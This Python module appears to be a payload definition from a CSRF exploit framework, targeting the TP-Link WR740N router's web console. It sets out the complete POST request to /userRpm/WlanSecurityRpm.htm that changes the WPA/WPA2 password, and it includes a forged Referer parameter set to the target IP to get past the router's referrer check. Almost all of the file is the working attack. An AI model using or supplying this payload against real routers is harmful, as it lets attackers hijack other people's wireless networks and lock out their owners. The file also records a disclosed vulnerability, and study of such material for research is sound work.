# -*- coding: utf-8 -*-

NAME = "TPLINK WR740N Multiple CSRF - Change WPA/WPA2 password"
DESCRIPTION = '''TPLINK WIreless Router WR740N has a Cross Site Request Forgery Vulnerability in its Web Console.

Application uses "HTTP-REFERER" check functionality to check for CSRF attacks. But it can easily be bypassed using the "Referer" parameter with value set to target's I.P in the GET request.'''

AUTHOR = "SaMaN( @samanL33T )"
DATE = "2013-11-25"

METHOD = "POST"
PATH = "/userRpm/WlanSecurityRpm.htm"

PARAMS = [
    {
        "name": "secType",
        "value": "3",
        "custom": False
    },
    {
        "name": "pskSecOpt",
        "value": "3",
        "custom": False
    },
    {
        "name": "pskCipher",
        "value": "3",
        "custom": False
    },
    {
        "name": "pskSecret",
        "value": "[WPA/WPA2_PASSWORD]",
        "custom": True,
        "description": "New WPA/WPA2 password"
    },
    {
        "name": "interval",
        "value": "0",
        "custom": False
    },
    {
        "name": "wpaSecOpt",
        "value": "3",
        "custom": False
    },
    {
        "name": "wpaCipher",
        "value": "1",
        "custom": False
    },
    {
        "name": "radiusIP",
        "value": "",
        "custom": False
    },
    {
        "name": "rediusPort",
        "value": "1812",
        "custom": False
    },
    {
        "name": "radiusSecret",
        "value": "",
        "custom": False
    },
    {
        "name": "IntervalWpa",
        "value": "0",
        "custom": False
    },
    {
        "name": "webSecOpt",
        "value": "1",
        "custom": False
    },
    {
        "name": "keytype",
        "value": "1",
        "custom": False
    },
    {
        "name": "keynum",
        "value": "1",
        "custom": False
    },
    {
        "name": "key1",
        "value": "",
        "custom": False
    },
    {
        "name": "length1",
        "value": "0",
        "custom": False
    },
    {
        "name": "key2",
        "value": "",
        "custom": False
    },
    {
        "name": "length2",
        "value": "0",
        "custom": False
    },
    {
        "name": "key3",
        "value": "",
        "custom": False
    },
    {
        "name": "length3",
        "value": "0",
        "custom": False
    },
    {
        "name": "key4",
        "value": "",
        "custom": False
    },
    {
        "name": "length4",
        "value": "0",
        "custom": False
    },
    {
        "name": "Save",
        "value": "Save",
        "custom": False
    },
    {
        "name": "Referer",
        "value": "http://[TARGET/IP]/",
        "custom": True,
        "description": "The target IP"
    },
]